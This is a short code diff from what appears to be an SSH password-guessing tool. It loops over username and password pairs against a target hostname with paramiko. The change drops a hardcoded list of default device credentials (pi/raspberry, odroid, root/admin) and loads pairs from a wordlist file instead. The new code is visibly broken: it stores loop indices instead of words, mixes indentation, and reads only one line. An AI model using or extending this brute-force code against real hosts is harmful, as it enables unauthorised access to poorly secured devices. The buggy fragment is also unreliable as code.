@@ -18,9 +18,19 @@ def compute(hostname):
                 client = paramiko.client.SSHClient()
                 client.load_system_host_keys()
                 client.set_missing_host_key_policy(paramiko.WarningPolicy)
-                uid_list=["pi","odroid","root","admin"]
-                pwd_list=["raspberry","odroid","root","admin","password"]
-                for uid in uid_list:
+                splitted=[]
+	            f=open('wordlist 1.txt','r')
+	            for i in f.readline().split(' '):
+	            	if bool(i)==True:
+	            		splitted.append(i)
+	            uid_list=[]
+	            pwd_list=[]
+	            for i in range(len(splitted)):
+	            	if i==0 or i%2==0:
+	            		uid_list.append(i)
+	            	else:
+	            		pwd_list.append(i)
+	            for uid in uid_list:
                     for pwd in pwd_list:
                         try:
                             if cracked == False:
